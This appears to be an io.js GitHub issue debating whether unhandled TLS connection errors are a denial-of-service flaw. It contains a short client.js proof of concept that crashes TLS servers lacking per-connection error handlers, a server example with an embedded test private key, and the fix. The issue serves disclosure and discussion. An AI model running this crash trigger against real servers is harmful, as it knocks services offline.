@@ -1,0 +1,41 @@
+Discussion: easy to trigger 'error' events on tls server connections, DoS vector || caveat emptor?
+
+
+This is something that's been floating around in email amongst the io.js TC for a little while now and we don't have a clear agreement on how we want to approach this or if we even want to do anything about it at all. So this is now open for public discussion and we'll be interested to hear feedback from @nodejs/collaborators and the new @nodejs/tsc.
+While investigating #1595, @shigeki came across an interesting case where it's trivial to kill a tls server (not https) that's not well crafted.
+server.js
+var tls = require('tls');
+
+var options = {
+  key: "-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDKLvYmbfsgnZvQ+ndYK6F9qT0o2yrr+rC3g+hGwz3Lpfzc8UqY\nFdsMOhRsr0cPiGSlDnO+/RW4crYDIYUU3PuW+KMM3IgD7QHEaSxjoILiqS03eTJv\nUJQvwsrGuOb6iB7aAAeuOX0tMRXqBRDdNgH4lNiQ17VY6J8CsbcwEA/ssQIDAQAB\nAoGAEwNVjImdKxUHOSDEplr8BcgrgzMRFz3s7mUOK9Fid0s1u0VJoYG0prKzhwD4\nqsJFzKvOQLCmIUFQUn0NecfKNN5yJ8kijGTBqgW+TiTSZjGpja0x8gwrUQw/ji11\nS+CT1rtVlhztlkM1MzitaEjmmhu2/06TUkpgC2SuDvv9ya0CQQDWm+WjlmPXoAME\nQPyOGL/zxbAFIYM2wLBZ6JgHCwnz0FI6a+sfUcOshD9x2QIYDHT3Wcf68BhYefC2\n9dg6oRsHAkEA8S2RAhl65OeEhhhPY86TBn9bpBmX+zKHMgcs3dQTOjjgSFuGhKT8\nklcppULdeM7M1XwAKuC26wQ5HrVk3+j0hwJAXJwPv8UxNqZ1RsuocMVbaB3B9KTe\nk60ZLONDX56y38ThBxb08qH9F6BGJKHp1mjhvK/ArZgYWW3do4Z5letZ1wJBAOUk\n8QB4qw3vdjddw5hFfeWPfcdlVcQiFteOf69nvrjzrwywgRdoFl0IGZZd+ES+31j6\njsIubTzP72Fg4S3ojOMCQHTOx5F/hXoKmGcLkABAQfaFdZ0jnRAAX46FKqFv/BHA\nxtApaVJwxPOJbFUsTrOxlDLtG0jha4aOVMxv9uuRTeo=\n-----END RSA PRIVATE KEY-----",
+  cert: "-----BEGIN CERTIFICATE-----\nMIIBsTCCARygAwIBAgIDAQABMAsGCSqGSIb3DQEBCzATMREwDwYDVQQDFgh0ZXN0\nLmNvbTAeFw03MDAxMDEwMDAwMDBaFw0yNTA1MDMxMjQ2MjhaMBMxETAPBgNVBAMW\nCHRlc3QuY29tMIGdMAsGCSqGSIb3DQEBAQOBjQAwgYkCgYEAyi72Jm37IJ2b0Pp3\nWCuhfak9KNsq6/qwt4PoRsM9y6X83PFKmBXbDDoUbK9HD4hkpQ5zvv0VuHK2AyGF\nFNz7lvijDNyIA+0BxGksY6CC4qktN3kyb1CUL8LKxrjm+oge2gAHrjl9LTEV6gUQ\n3TYB+JTYkNe1WOifArG3MBAP7LECAwEAAaMZMBcwFQYDVR0RBA4wDIIKKi50ZXN0\nLmNvbTALBgkqhkiG9w0BAQsDgYEAOtZx1MOYqgJHLJ+bsN7M/Aq/6x3RRhFxrbqP\nEFO4IzQIhKBdSXCBWVEZ4zquuHGUErBR8a9vPzKElRw0mUgXiAtRuMe8KpqEplhf\nM7pIm57Z1OhsIqUllYTdTXO7GP7NC3bvLKSffnnu2IRVuC3GSt8V4yJXbV9gO07U\nWyy7EXQ=\n-----END CERTIFICATE-----"
+};
+
+tls.createServer(options, function(clientSocket) {
+}).listen(1443);
+client.js
+var net = require('net');
+var tls = require('tls');
+var socket = net.connect(1443);
+var client = tls.connect({
+ socket: socket,
+ rejectUnauthorized: false
+}, function() {
+  socket.write('a'); // note the use of `socket` not `client`
+  client.end();
+});
+i.e. by writing directly to the socket rather than the encrypted channel the client can force an 'error' event on the server connection (clientSocket, not the server itself).
+Of course, if you simply handle the 'error' event on clientSocket then you catch it:
+tls.createServer(options, function(clientSocket) {
+  clientSocket.on('error', function() {})
+}).listen(1443);
+Some think that this may be classifiable as a DoS vulnerability, while others question whether this should even be considered a bug.
+I think it comes down to how you view TLS as a "protocol". Is it like HTTP in that it sits on top of TCP and is a parsed and managed protocol that provides a higher level of abstraction to the user? Or is it closer to TCP in that it's a raw protocol and can be easily abused and you don't get many guarantees about protocol handling? The HTTP handling in io.js/Node.js provides a nice encapsulation of per-connection parsing, the client can do something wrong and move outside of the bounds of the protocol and it's just disconnected without that bubbling up to the server code. However with the current TLS API a client that isn't talking within the bounds of the protocol will cause an error that bubbles all the way up and if 'error' event is not handled on each connection it will bring down the entire process.
+With HTTP you can do this:
+$ node -e "require('http').createServer(function (req, res) { console.log('connect'); res.end('done') }).listen(8080)"
+
+and then this:
+$ echo -e 'GET /\nWUT' | nc localhost 8080
+
+doesn't get through to the handler at all because the client is misbehaving and is therefore simply disconnected.
+As an aside, @shigeki did the right thing with this, he had a concern that this could be abused in the real-world and took it directly to the TC to discuss before raising it publicly. We've had some vigorous discussions about this and haven't agreed that it should be categorised as a security concern but if we had then it would have been handled discreetly and a fix pushed out with a matter of urgency as well as filling a CVE for it. So, if you find something like this, please take it to email. We'll have a proper security@ email soon enough but for now just find someone you know and trust on the list of TC members and contact them.
